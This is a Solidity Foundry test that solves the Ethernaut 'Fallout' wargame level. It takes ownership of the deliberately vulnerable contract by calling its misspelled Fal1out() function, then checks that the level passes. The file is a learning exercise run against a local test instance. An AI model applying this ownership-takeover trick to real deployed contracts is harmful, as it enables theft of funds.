// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "../Ethernaut.sol";
import "../Fallout/FalloutFactory.sol";
import "../Fallout/Fallout.sol";

contract FalloutTest is DSTest {
    // 0x710... is a special address
    // See https://onbjerg.github.io/foundry-book/forge/cheatcodes.html
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testFalloutSolution() public {
        // Setup
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout level = Fallout(payable(levelAddress));

        // Solution
        level.Fal1out();
        assertEq(level.owner(), eoaAddress);

        // Verify
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);

    }

}
